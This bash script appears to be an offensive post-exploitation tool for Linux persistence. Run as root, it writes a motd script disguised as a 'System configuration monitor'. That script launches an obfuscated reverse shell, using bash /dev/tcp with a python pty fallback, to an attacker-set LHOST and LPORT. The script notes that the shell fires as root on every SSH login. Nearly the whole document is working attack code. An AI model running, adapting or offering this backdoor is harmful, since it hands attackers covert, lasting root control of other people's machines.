#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/obfuscate.sh"

LHOST="${LHOST:-}"
LPORT="${LPORT:-4444}"

MOTD_SCRIPT="/etc/update-motd.d/98-dconf-monitor"

info()    { echo "[*] $*"; }
success() { echo "[+] $*"; }
error()   { echo "[-] $*" >&2; }
warn() { echo "[!] $*"; }


# -- Preflight checks --
if [[ "$(id -u)" -ne 0 ]]; then
    error "This script must be run as root"
    exit 1
fi

if [[ -z "$LHOST" ]]; then
    error "LHOST is not set. Export it before running:"
    error " Export LHOST=<ip address>"
    exit 1
fi

if [[ ! -d /etc/update-motd.d ]]; then
    error "/etc/update-motd.d does not exist on this system"
    exit 1
fi


# -- Payload --

RAW_PAYLOAD="bash -c 'exec bash -i &>/dev/tcp/${LHOST}/${LPORT} <&1' 2>/dev/null || python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")' 2>/dev/null"

DECODER=$(ob_guarded_decoder_root "$RAW_PAYLOAD")


# -- Install --

if [[ -f "$MOTD_SCRIPT" ]]; then
    warn "motd script already exists at ${MOTD_SCRIPT} — skipping"
    exit 0
fi

info "Installing motd script..."

cat > "$MOTD_SCRIPT" <<EOF
#!/bin/bash
# System configuration monitor
${DECODER} &
printf "\n"
EOF

chmod 755 "$MOTD_SCRIPT"

success "motd script installed: ${MOTD_SCRIPT}"
info "Fires as root on every SSH login"
info "Remove with: rm ${MOTD_SCRIPT}"